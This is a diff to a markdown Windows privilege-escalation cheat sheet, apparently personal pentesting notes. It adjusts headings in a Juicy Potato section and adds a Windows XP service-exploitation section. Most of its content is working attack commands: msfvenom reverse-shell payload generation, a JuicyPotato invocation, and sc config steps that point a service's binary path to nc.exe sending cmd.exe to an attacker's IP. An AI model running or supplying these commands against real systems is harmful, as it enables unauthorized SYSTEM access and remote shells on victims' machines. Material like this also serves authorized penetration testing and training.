@@ -164,17 +164,17 @@ Found [here](https://github.com/ohpe/juicy-potato) ([pre-compile binaries](https
 - Windows Server 2012 Datacenter
 - Windows Server 2016 Standard
 
-### Required Permissions
+#### Required Permissions
 - <code>SeImpersonate</code>
 - <code>SeAssignPrimaryToken</code>
 
-### Generating the payload
+#### Generating the payload
 
 Windows x64: <code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=[LOCAL-IP] LPORT=[PORT] -f exe -o shell.exe</code>
 
 Windows x82: <code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL-IP] LPORT=[PORT] -f exe -o shell.exe</code>
 
-### Execution
+#### Execution
 
 Create the listener to cath the payload
 
@@ -183,3 +183,40 @@ Create the listener to cath the payload
 Run the exploit on the target host.
 
 <code>JuicyPotato.exe -l 1337 -p [DIR\TO\EXPLOIT] -t * -c {CLSID}</code>
+
+### Service Exploitation
+
+
+#### Windows XP SP0/SP1
+
+Upload <code>accesschk.exe</code> and <code>nc.exe</code> to the target host.
+
+<code>accesschk.exe /accepteula -uwcqv "Autenticated Users" *</code>
+
+Running the following gives more information about the specified service (i.e. what groups have what permissions over it).
+
+<code>accesschk.exe /accepteula -ucqv [SERVICE]</code>
+
+To see the start type, dependencies, and binary path the service uses:
+
+<code>sc qc [SERVICE]</code>
+
+Check the status of the service.
+
+<code>sc query [SERVICE]</code>
+
+If needed, change the start type of the service 
+
+<code>sc config [SERVICE] start= auto</code>
+
+Changing the binary path:
+
+<code>sc config [SERVICE] binpath= [PATH\TO\nc.exe [KALI IP] [PORT] -e C:\WINDOWS\System32\cmd.exe]</code>
+
+Setup the netcat listener and start the service.
+
+Starting / Stopping the Service
+
+<code>net start [SERVICE]</code>
+
+<code>net stop [SERVICE]</code>
